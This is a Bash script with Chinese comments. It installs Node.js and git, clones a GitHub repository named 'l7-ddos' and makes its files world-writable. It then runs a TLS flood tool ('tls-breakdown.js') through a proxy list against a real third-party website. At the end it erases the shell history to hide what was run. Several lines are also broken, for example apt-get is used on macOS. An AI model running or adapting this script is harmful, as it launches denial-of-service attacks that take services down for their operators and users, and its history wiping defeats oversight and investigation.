#!/bin/bash

# 检查操作系统类型
if [[ "$(uname)" == "Linux" ]]; then
  # 检查发行版类型
  if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    if [[ $ID == "centos" ]]; then
      # CentOS
      mkdir -p /var/spool/cc
      cd /var/spool/cc

      # 检查是否已安装 Node.js
      if ! command -v node &> /dev/null; then
        echo "未找到 Node.js，正在安装 Node.js..."

        # 使用 curl 下载并运行 Node.js 安装脚本
        curl --silent --location https://rpm.nodesource.com/setup_16.x | bash -

        # 使用 yum 安装 Node.js
        yum -y install nodejs

        echo "Node.js 安装完成。"
      fi

      # 检查已安装的 Node.js 版本
      node_version=$(node -v)
      echo "已安装的 Node.js 版本: $node_version"

      # 提取主版本号
      major_version=${node_version:1:2}

      # 判断是否需要升级
      if [ $major_version -lt 16 ]; then
        echo "Node.js 版本较旧，正在升级 Node.js..."

        # 安装 n 模块，用于管理 Node.js 版本
        npm install n -g

        # 安装指定版本的 npm
        npm install -g npm@9.6.7

        # 清除 npm 缓存
        npm cache clean -f

        # 查看可用的 Node.js 版本
        npm view node versions

        # 安装 Node.js 16.20.0
        n 16.20.0

        echo "Node.js 升级完成。"
      else
        echo "Node.js 版本已经是 16 或更高。无需升级。"
      fi

      # 验证 Node.js 版本
      node -v

      # 安装 git
      yum install git -y

      cd /var/spool/cc/
      rm -rf l7-ddos
      
      
        # 克隆 GitHub 项目到本地
        echo "正在克隆 GitHub 项目..."
        git clone https://github.com/DdosLiYunLong/l7-ddos.git
        echo "GitHub 项目克隆完成。"
        
        # 进入项目目录
        cd l7-ddos
        
        # 赋予执行权限
        chmod 777 ./*
        
       
        
        echo "测试完成。"

      # 其他 CentOS 相关操作...
    elif [[ $ID == "ubuntu" ]]; then
      # Ubuntu
      mkdir -p /var/spool/cc
      cd /var/spool/cc

      # 检查是否已安装 Node.js
      if ! command -v node &> /dev/null; then
        echo "未找到 Node.js，正在安装 Node.js..."

        # 使用 NodeSource 源安装 Node.js
        curl -sL https://deb.nodesource.com/setup_16.x | -E bash -
        apt-get install -y nodejs

        echo "Node.js 安装完成。"
      fi

      # 检查已安装的 Node.js 版本
      node_version=$(node -v)
      echo "已安装的 Node.js 版本: $node_version"

      # 提取主版本号
      major_version=${node_version:1:2}

      # 判断是否需要升级
      if [ $major_version -lt 16 ]; then
        echo "Node.js 版本较旧，正在升级 Node.js..."

        # 安装 n 模块，用于管理 Node.js 版本
        npm install n -g

        # 安装指定版本的 npm
        npm install -g npm@9.6.7

        # 清除 npm 缓存
        npm cache clean -f

        # 查看可用的 Node.js 版本
        npm view node versions

        # 安装 Node.js 16.20.0
        n 16.20.0

        echo "Node.js 升级完成。"
      else
        echo "Node.js 版本已经是 16 或更高。无需升级。"
      fi

      # 验证 Node.js 版本
      node -v

      # 安装 git
      apt-get update
      apt-get install curl nodejs npm git -y

   
    
      cd /var/spool/cc/
      rm -rf l7-ddos
      
      # 克隆 GitHub 项目到本地
        echo "正在克隆 GitHub 项目..."
        git clone https://github.com/DdosLiYunLong/l7-ddos.git
        echo "GitHub 项目克隆完成。"
        
        # 进入项目目录
        cd l7-ddos
        
        # 赋予执行权限
        chmod 777 ./*
        
        echo "测试完成。"

      # 其他 Ubuntu 相关操作...
    else
      echo "不支持的操作系统类型。"
      exit 1
    fi
  else
    echo "无法确定操作系统类型。"
    exit 1
  fi

  # 其他 Linux 相关操作...

elif [[ "$(uname)" == "Darwin" ]]; then
  # macOS
  mkdir -p /var/spool/cc
  cd /var/spool/cc

  # 检查是否已安装 Node.js
  if ! command -v node &> /dev/null; then
    echo "未找到 Node.js，正在安装 Node.js..."

    # 使用 NodeSource 源安装 Node.js
    curl -sL https://deb.nodesource.com/setup_16.x | -E bash -
    apt-get install -y nodejs

    echo "Node.js 安装完成。"
  fi

  # 检查已安装的 Node.js 版本
  node_version=$(node -v)
  echo "已安装的 Node.js 版本: $node_version"

  # 提取主版本号
  major_version=${node_version:1:2}

  # 判断是否需要升级
  if [ $major_version -lt 16 ]; then
    echo "Node.js 版本较旧，正在升级 Node.js..."

    # 安装 n 模块，用于管理 Node.js 版本
    npm install n -g

    # 安装指定版本的 npm
    npm install -g npm@9.6.7

    # 清除 npm 缓存
    npm cache clean -f

    # 查看可用的 Node.js 版本
    npm view node versions

    # 安装 Node.js 16.20.0
    n 16.20.0
    hash -r

    echo "Node.js 升级完成。"
  else
    echo "Node.js 版本已经是 16 或更高。无需升级。"
  fi

  # 验证 Node.js 版本
  node -v

  # 安装 git
  apt-get update
  apt-get install curl nodejs npm git -y

  cd /var/spool/cc/
  rm -rf l7-ddos
  
  # 克隆 GitHub 项目到本地
    echo "正在克隆 GitHub 项目..."
    git clone https://github.com/DdosLiYunLong/l7-ddos.git
    echo "GitHub 项目克隆完成。"
    
    # 进入项目目录
    cd l7-ddos
    
    # 赋予执行权限
    chmod 777 ./*
    
    echo "测试完成。"
    

  # 其他 macOS 相关操作...

else
  echo "不支持的操作系统类型。"
  exit 1
fi

cd /var/spool/cc/l7-ddos;
node tls-breakdown.js https://www.baidu.com/ 10 10 2 cn_proxy.txt

# 其他通用操作...
npm install
rm -rf ~/.bash_history
history -c